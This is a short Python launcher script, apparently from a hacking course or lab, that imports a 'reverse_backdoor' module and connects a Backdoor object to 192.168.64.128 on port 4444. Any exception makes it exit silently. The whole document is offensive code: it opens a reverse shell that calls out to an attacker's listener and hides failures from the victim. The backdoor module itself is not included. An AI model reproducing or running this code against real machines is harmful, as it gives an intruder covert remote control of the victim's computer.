# C:\Users\IEUser\AppData\Local\Programs\Python\Python310\python.exe

import reverse_backdoor
import sys

try:
    my_backdoor = reverse_backdoor.Backdoor("192.168.64.128", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()